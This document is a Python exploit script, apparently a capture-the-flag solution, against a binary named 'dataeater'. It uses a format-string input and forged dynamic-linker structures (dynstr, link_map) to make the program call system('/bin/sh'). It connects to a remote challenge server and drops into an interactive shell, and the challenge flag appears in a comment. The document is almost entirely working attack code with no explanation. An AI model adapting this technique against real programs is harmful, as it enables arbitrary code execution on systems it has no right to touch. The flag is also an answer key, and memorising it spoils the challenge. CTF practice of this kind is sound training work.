#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './dataeater'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':'b *0x4006fc'}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'mc.ax', 'port':31869})
env.select()

#==========

binf = ELF(bin_file)
# addr_dynamic        = binf.sep_section['.dynamic']
addr_dynstr         = binf.sep_section['.dynstr']
addr_bss            = binf.sep_section['.bss']
addr_buf            = addr_bss + 0x20

#==========

def attack(conn, **kwargs):
    conn.sendline(b'%s%32$s')

    addr_str_memset      = next(binf.search(b'memset'))
    offset_dynstr_memset = addr_str_memset - addr_dynstr

    str_sh  = b'/bin/sh'.ljust(8, b'\0')
    dynstr  = b'system'.ljust(8, b'\0')
    dynamic = flat(5, addr_buf+8 - offset_dynstr_memset)
    conn.sendline(str_sh + dynstr + dynamic)

    linkmap  = b'\x00'*0x40
    # linkmap += flat(0, 0, addr_dynamic+0xe0, addr_dynamic+0xd0, 0, addr_buf+0x10)[:-1]
    linkmap += flat(0, 0, 0, 0, 0, addr_buf+0x10)[:-1]
    conn.sendline(linkmap)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # dice{1nfin1t3_f1v3_lin3_ch4lls_f46297a09e671c6a}

if __name__=='__main__':
    main()

#==========
